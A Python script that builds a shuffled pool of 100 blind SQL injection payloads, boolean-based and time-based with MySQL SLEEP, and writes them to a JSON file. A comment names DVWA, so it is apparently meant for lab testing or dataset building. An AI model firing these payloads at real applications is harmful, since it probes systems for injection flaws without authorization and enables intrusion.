import json
import os
import random


OUTPUT_FILE = "data/base_payloads.json"

TARGET_BOOLEAN = 80
TARGET_TIME = 20


boolean_payloads = []
time_payloads = []


def add_unique(pool, payload, payload_type):
    entry = {
        "payload": payload,
        "type": payload_type
    }

    if entry not in pool:
        pool.append(entry)


# ==========================================================
# 1. NUMERIC BOOLEAN PAYLOADS
# ==========================================================

numeric_conditions = [
    "1=1",
    "2=2",
    "3=3",
    "4=4",
    "5=5",

    "2>1",
    "3>2",
    "4>3",
    "5>4",
    "6>5",

    "2>=1",
    "3>=2",
    "4>=3",
    "5>=4",
    "6>=5",

    "1<2",
    "2<3",
    "3<4",
    "4<5",
    "5<6",

    "1<>2",
    "2<>3",
    "3<>4",
    "4<>5",
    "5<>6"
]


prefixes = [
    "1'",
    "2'",
    "3'",
    "4'",
    "5'"
]


for condition in numeric_conditions:

    for prefix in prefixes:

        add_unique(
            boolean_payloads,
            f"{prefix} AND {condition} -- -",
            "boolean"
        )


# ==========================================================
# 2. STRING BOOLEAN PAYLOADS
# ==========================================================

string_conditions = [
    "'a'='a'",
    "'b'='b'",
    "'c'='c'",
    "'x'='x'",
    "'y'='y'",

    "'a'!='b'",
    "'b'!='c'",
    "'c'!='d'",
    "'x'!='y'",
    "'y'!='z'",

    "'a'<>'b'",
    "'b'<>'c'",
    "'x'<>'y'"
]


for condition in string_conditions:

    add_unique(
        boolean_payloads,
        f"1' AND {condition} -- -",
        "boolean"
    )

    add_unique(
        boolean_payloads,
        f"1' OR {condition} -- -",
        "boolean"
    )


# ==========================================================
# 3. LENGTH BOOLEAN PAYLOADS
# ==========================================================

length_conditions = [
    "LENGTH('a')=1",
    "LENGTH('x')=1",
    "LENGTH('ab')=2",
    "LENGTH('abc')=3",
    "LENGTH('test')=4",
    "LENGTH('hello')=5",

    "LENGTH('ab')>1",
    "LENGTH('abc')>2",
    "LENGTH('test')>3",
    "LENGTH('hello')>4",

    "LENGTH('abc')>=3",
    "LENGTH('test')>=4"
]


for condition in length_conditions:

    add_unique(
        boolean_payloads,
        f"1' AND {condition} -- -",
        "boolean"
    )


# ==========================================================
# 4. ASCII BOOLEAN PAYLOADS
# ==========================================================

ascii_conditions = [
    "ASCII('A')=65",
    "ASCII('B')=66",
    "ASCII('C')=67",
    "ASCII('D')=68",

    "ASCII('a')=97",
    "ASCII('b')=98",
    "ASCII('c')=99",
    "ASCII('d')=100",

    "ASCII('B')>65",
    "ASCII('C')>66",
    "ASCII('D')>67",

    "ASCII('b')>97",
    "ASCII('c')>98",
    "ASCII('d')>99"
]


for condition in ascii_conditions:

    add_unique(
        boolean_payloads,
        f"1' AND {condition} -- -",
        "boolean"
    )


# ==========================================================
# 5. TIME PAYLOADS
#
# AND SLEEP only.
# OR SLEEP is intentionally excluded because it can
# short-circuit in the DVWA/MySQL environment.
# ==========================================================

sleep_values = [
    2,
    3,
    4,
    5
]


time_prefixes = [
    "1'",
    "2'",
    "3'",
    "4'",
    "5'"
]


for prefix in time_prefixes:

    for seconds in sleep_values:

        add_unique(
            time_payloads,
            f"{prefix} AND SLEEP({seconds}) -- -",
            "time"
        )


# ==========================================================
# BUILD FINAL CONTROLLED POOL
# ==========================================================

random.shuffle(
    boolean_payloads
)

random.shuffle(
    time_payloads
)


selected_boolean = boolean_payloads[
    :TARGET_BOOLEAN
]

selected_time = time_payloads[
    :TARGET_TIME
]


payloads = (
    selected_boolean
    +
    selected_time
)


# Shuffle final file so time payloads are not all at the end
random.shuffle(
    payloads
)


# ==========================================================
# VALIDATION
# ==========================================================

if len(selected_boolean) != TARGET_BOOLEAN:

    raise RuntimeError(
        f"Only generated "
        f"{len(selected_boolean)} boolean payloads, "
        f"expected {TARGET_BOOLEAN}"
    )


if len(selected_time) != TARGET_TIME:

    raise RuntimeError(
        f"Only generated "
        f"{len(selected_time)} time payloads, "
        f"expected {TARGET_TIME}"
    )


if len(payloads) != 100:

    raise RuntimeError(
        f"Expected 100 payloads, got {len(payloads)}"
    )


unique_count = len({
    entry["payload"]
    for entry in payloads
})


if unique_count != len(payloads):

    raise RuntimeError(
        "Duplicate base payloads detected"
    )


# ==========================================================
# SAVE
# ==========================================================

os.makedirs(
    "data",
    exist_ok=True
)


with open(
    OUTPUT_FILE,
    "w"
) as f:

    json.dump(
        payloads,
        f,
        indent=2
    )


print(
    f"✅ Base payload pool generated: "
    f"{len(payloads)}"
)

print(
    f"🔵 Boolean: "
    f"{len(selected_boolean)}"
)

print(
    f"🟠 Time: "
    f"{len(selected_time)}"
)

print(
    f"🔒 Unique: "
    f"{unique_count}"
)

print(
    f"💾 Saved to: "
    f"{OUTPUT_FILE}"
)
